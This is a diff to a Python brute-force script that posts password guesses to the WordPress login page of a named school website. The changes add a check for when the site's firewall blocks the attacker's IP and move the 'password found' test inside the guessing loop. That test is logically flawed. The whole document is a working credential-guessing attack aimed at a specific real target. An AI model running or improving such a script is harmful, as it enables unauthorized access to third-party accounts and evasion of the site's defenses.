@@ -44,20 +44,23 @@ def Brute():
         print("[*] Trying Password: " + password)
 
         response = requests.post('https://rnles.edu.in/wp-login.php', headers=headers, cookies=cookies, data=data)
+
+        if "The firewall on this server is blocking your connection" in response.text:
+            print("[-] Your IP Has Been Blocked By The Firewall")
+            sys.exit()
         
-    if "The password you entered for the username" and "Unauthorized Access" not in response.text:
-        print()
-        print("[+] Password Found: " + password)
-        pwd = "1"
-        sys.exit()
-    elif "Unauthorized Access" in response.text:
-        print("[-] Your IP Has Been Blocked By The Firewall")
-        sys.exit()
+        if "The password you entered for the username" and "Unauthorized Access" not in response.text:
+            print()
+            print("[+] Password Found: " + password)
+            pwd = "1"
+            sys.exit()
+
 
 try:
     thread = threading.Thread(target=Brute)
     thread.start()
     thread.join()
+
 except KeyboardInterrupt:
     print("[-] Aborted")
     sys.exit()
